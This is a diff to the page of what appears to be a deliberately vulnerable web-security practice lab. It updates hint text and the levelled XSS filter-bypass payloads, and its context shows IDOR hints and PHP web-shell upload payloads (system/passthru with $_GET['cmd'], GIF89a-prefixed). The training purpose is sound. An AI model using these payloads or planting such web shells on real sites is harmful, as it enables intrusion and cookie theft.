@@ -49,8 +49,7 @@ walkthroughs in <code>SOLUTIONS.md</code>. The real pages are still under <a hre
 
 <!-- Search: UNION SQLi (leveled) -->
 <div class="card"><h2><code>index.php?q=</code> <span class="flag-pill">🏁 UNION SQLi</span></h2>
-  <p class="muted">Directory search → dump the <code>users</code> table. The filter gets tougher each level.
-     <span class="note">(reflected XSS also lives here: <code>"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>)</span></p>
+  <p class="muted">Two bugs share this box. <b>SQLi</b> (use SQLi ▶) → read the <b>✓/✗ match</b> result below (expert is blind). <b>Reflected XSS</b> (use XSS ▶) → the payload breaks out of the search field and an <b>alert pops</b>; ignore the match line. Both filters escalate per level.</p>
   <div class="levels" id="lv_q"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('q','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('q','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('q','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('q','expert')">Expert</button></div>
   <details><summary>💡 hint — <span class="note" id="note_q"></span></summary>
     <code class="pl" id="pl_q"></code><button type="button" class="ghost" onclick="fill('in_q','pl_q')">use SQLi ▶</button>
@@ -164,9 +163,9 @@ const PAYLOADS = {
 };
 PAYLOADS.q.easy.x='"><script>alert(1)<\/script>';
 PAYLOADS.q.medium.x='"><img src=x onerror=alert(1)>';
-PAYLOADS.q.hard.x='"><details open ontoggle=alert(1)>';
-PAYLOADS.q.expert.x='"><input autofocus onfocus=alert(1)>';
-PAYLOADS.gb={easy:{p:"<script>alert(document.cookie)<\/script>",n:"Easy — raw render."},medium:{p:"<img src=x onerror=alert(document.cookie)>",n:"Medium — '<script' stripped once → <img onerror>."},hard:{p:"<details open ontoggle=alert(document.cookie)>",n:"Hard — onerror/onload also stripped → ontoggle."},expert:{p:"<input autofocus onfocus=alert(document.cookie)>",n:"Expert — ontoggle also stripped → autofocus+onfocus."}};
+PAYLOADS.q.hard.x='"><svg onload=alert(1)>';
+PAYLOADS.q.expert.x='"><svg><animate onbegin=alert(1) attributeName=x dur=1s>';
+PAYLOADS.gb={easy:{p:"<script>alert(document.cookie)<\/script>",n:"Easy — raw render."},medium:{p:"<img src=x onerror=alert(document.cookie)>",n:"Medium — '<script' stripped once → <img onerror>."},hard:{p:"<svg onload=alert(document.cookie)>",n:"Hard — onerror also stripped → <svg onload>."},expert:{p:"<svg><animate onbegin=alert(document.cookie) attributeName=x dur=1s>",n:"Expert — onload also stripped → <svg><animate onbegin>."}};
 PAYLOADS.id={easy:{p:"1",n:"Easy — raw id, just change it."},medium:{p:"(id box ignored)",n:"Medium — id comes from the uid cookie. Set cookie uid=1 in DevTools, then Run."},hard:{p:"MQ==",n:"Hard — id is base64. MQ== = base64 of 1."},expert:{p:"c4ca4238a0b923820dcc509a6f75849b",n:"Expert — id is md5(real). This string is md5 of 1."}};
 PAYLOADS.up={easy:{p:"<\x3Fphp system($_GET['cmd']); ?\x3E",n:"Easy — no checks."},medium:{p:"<\x3Fphp system($_GET['cmd']); ?\x3E",n:"Medium — content-type must be image/* (sent as image/gif for you)."},hard:{p:"GIF89a<\x3Fphp system($_GET['cmd']); ?\x3E",n:"Hard — content must start with GIF89a magic bytes (prefixed)."},expert:{p:"GIF89a<\x3Fphp passthru($_GET['cmd']); ?\x3E",n:"Expert — the word 'system' is blocked → passthru()."}};
 function setLvl(card,lvl){
